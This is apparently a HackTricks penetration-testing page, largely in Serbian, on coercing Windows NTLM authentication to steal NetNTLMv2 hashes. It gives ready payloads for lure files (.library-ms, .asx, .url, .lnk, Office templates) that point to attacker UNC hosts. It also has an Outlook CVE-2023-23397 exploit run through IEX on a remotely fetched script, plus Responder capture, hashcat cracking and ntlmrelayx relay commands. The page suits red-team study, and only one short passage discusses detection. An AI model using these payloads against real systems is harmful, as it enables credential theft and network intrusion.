# Mesta za krađu NTLM kredencijala

{{#include ../../banners/hacktricks-training.md}}

**Pogledajte sve sjajne ideje na [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), od preuzimanja microsoft word datoteke online do izvora ntlm leak-ova: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md i [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### SMB share sa dozvolom upisa + UNC mamci koje pokreće Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Ako možete da **pišete u share koji korisnici ili zakazani poslovi pregledaju u Explorer-u**, postavite datoteke čiji metadata pokazuje na vaš UNC (npr. `\\ATTACKER\share`). Prikazivanje fascikle pokreće **implicitnu SMB autentifikaciju** i odaje **NetNTLMv2** vašem listener-u.<sup>[[1]](#references)</sup>

1. **Generišite mamce** (obuhvata SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/itd.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Postavite ih na deljeni resurs sa dozvolom upisa** (bilo koju fasciklu koju žrtva otvori):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Osluškuj i crackuj**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows može pristupiti više datoteka odjednom; za sve što Explorer prikaže u pregledu (`BROWSE TO FOLDER`) nisu potrebni klikovi.

### Windows Media Player playlists (.ASX/.WAX)

Ako navedete metu da otvori ili pregleda Windows Media Player playlistu koju kontrolišete, možete izazvati leak Net‑NTLMv2 tako što ćete unos usmeriti na UNC putanju. WMP će pokušati da preuzme referencirani medij preko SMB-a i implicitno će se autentifikovati.<sup>[[3]](#references)[[4]](#references)</sup>

Primer payload-a:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Tok prikupljanja i crackovanja:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### NTLM leak ugrađen u ZIP .library-ms (CVE-2025-24071/24055)

Windows Explorer nesigurno obrađuje .library-ms datoteke kada se otvore direktno iz ZIP arhive. Ako definicija biblioteke upućuje na udaljenu UNC putanju (npr. \\attacker\share), samo pregledanje/pokretanje .library-ms datoteke unutar ZIP-a uzrokuje da Explorer enumeriše UNC i pošalje NTLM autentikaciju napadaču. Time se dobija NetNTLMv2 koji se može crackovati offline ili potencijalno relay-ovati.<sup>[[2]](#references)</sup>

Minimalni .library-ms koji upućuje na napadačev UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operativni koraci
- Kreirajte .library-ms fajl sa XML-om iznad (postavite svoju IP adresu/hostname).
- Zipujte ga (na Windows-u: Send to → Compressed (zipped) folder) i isporučite ZIP meti.
- Pokrenite listener za NTLM capture i sačekajte da žrtva otvori .library-ms iz ZIP-a.


### Putanja zvuka Outlook calendar reminder-a (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook for Windows obrađivao je extended MAPI property PidLidReminderFileParameter u calendar stavkama. Ako je to property upućivao na UNC putanju (npr. `\\attacker\share\alert.wav`), Outlook bi kontaktirao SMB share kada se reminder aktivira, što je dovodilo do leak-a korisnikovog Net-NTLMv2 bez ikakvog klika. Ovo je zakrpljeno 14. marta 2023, ali je i dalje veoma relevantno za legacy/neizmenjena okruženja i istorijsku analizu incidenata.<sup>[[5]](#references)</sup>

Brza eksploatacija pomoću PowerShell-a (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Na strani listenera:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Beleške
- Žrtva samo treba da ima pokrenut Outlook for Windows kada se aktivira podsetnik.
- leak daje Net‑NTLMv2 pogodan za offline cracking ili relay (ne za pass-the-hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – zaobilaženje CVE‑2025‑24054)

Windows Explorer automatski prikazuje ikone prečica. Nedavna istraživanja pokazala su da je, čak i nakon Microsoft zakrpe iz aprila 2025. za UNC‑icon prečice, i dalje bilo moguće pokrenuti NTLM authentication bez klikova tako što se target prečice hostuje na UNC putanji, dok se ikona zadrži lokalno (zaobilaženje zakrpe dobilo je oznaku CVE‑2025‑50154). Samo pregledanje foldera navodi Explorer da preuzme metadata sa remote targeta, pri čemu se NTLM šalje attacker SMB serveru.<sup>[[6]](#references)</sup>

Minimalni Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Programiranje Shortcut payload-a (.lnk) putem PowerShell-a:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Ideje za isporuku
- Ubacite shortcut u ZIP i navedite žrtvu da ga pregleda.
- Postavite shortcut na writable share koji će žrtva otvoriti.
- Kombinujte ga sa drugim lure fajlovima u istom folderu kako bi Explorer prikazao preview stavki.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows učitava `.lnk` metadata tokom **view/preview** (renderovanja ikone), a ne samo prilikom izvršavanja. CVE‑2026‑25185 pokazuje parsing putanju u kojoj **ExtraData** blokovi navode shell da razreši putanju ikone i pristupi filesystemu **tokom učitavanja**, pri čemu se emituje outbound NTLM kada je putanja remote.

Ključni uslovi za aktiviranje (uočeni u `CShellLink::_LoadFromStream`):
- Uključite **DARWIN_PROPS** (`0xa0000006`) u ExtraData (uslov za pokretanje rutine za ažuriranje ikone).
- Uključite **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) sa popunjenim poljem **TargetUnicode**.
- Loader proširuje environment variables u `TargetUnicode` i poziva `PathFileExistsW` nad dobijenom putanjom.

Ako se `TargetUnicode` razreši u UNC putanju (npr. `\\attacker\share\icon.ico`), **samo pregled foldera** koji sadrži shortcut izaziva outbound authentication. Ista load putanja može biti aktivirana i indexingom i AV scanningom, što je čini praktičnom no-click leak površinom.<sup>[[7]](#references)</sup>

Research tooling (parser/generator/UI) dostupan je u projektu **LnkMeMaybe** za izradu i pregled ovih struktura bez korišćenja Windows GUI-ja.<sup>[[8]](#references)</sup>


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

Native **WebDAV client** može biti zloupotrebljen za prisiljavanje trenutne logon sesije da se autentifikuje na proizvoljnom **HTTP/WebDAV** endpointu:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Zašto je ovo korisno:
- Protiv **WebDAV servera pod kontrolom napadača**, može pokrenuti **NTLM over HTTP** bez pokretanja prilagođenog client-a.
- Protiv **internih hostova**, ovo je diskretan način da se proveri gde se prihvataju ukradeni akreditivi pre lateralnog kretanja.<sup>[[9]](#references)</sup>
- Komanda je dobra alternativa kada je **SMB egress** filtriran, ali su **HTTP/WebDAV** i dalje dostupni.

Operativne napomene:
- **WebClient** servis mora biti pokrenut na izvornom hostu.
- `rundll32.exe` učitava `davclnt.dll` i omogućava Windows-u da obavi WebDAV autentifikaciju koristeći **akreditive trenutnog korisnika**.<sup>[[10]](#references)</sup>
- Ako ga usmeravate ka infrastrukturi koju kontrolišete, koristite HTTP listener/relay koji podržava NTLM, kao što je:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
From a detection perspective, repeated `rundll32.exe davclnt.dll,DavSetCookie` executions against many internal systems are a strong signal of **credential validation / spray-like lateral movement prep** rather than normal user behaviour.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) to coerce NTLM

Office documents can reference an external template. If you set the attached template to a UNC path, opening the document will authenticate to SMB.

Minimal DOCX relationship changes (inside word/):

1) Edit word/settings.xml and add the attached template reference:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Izmenite word/_rels/settings.xml.rels i usmerite rId1337 na vaš UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Ponovo spakujte u .docx i isporučite. Pokrenite svoj SMB capture listener i sačekajte otvaranje.

Za ideje nakon capture-a u vezi sa relay-om ili zloupotrebom NTLM-a pogledajte:

{{#ref}}
README.md
{{#endref}}


## Reference
- [1] [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Places Of Interest In Stealing Netntlm Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)


{{#include ../../banners/hacktricks-training.md}}
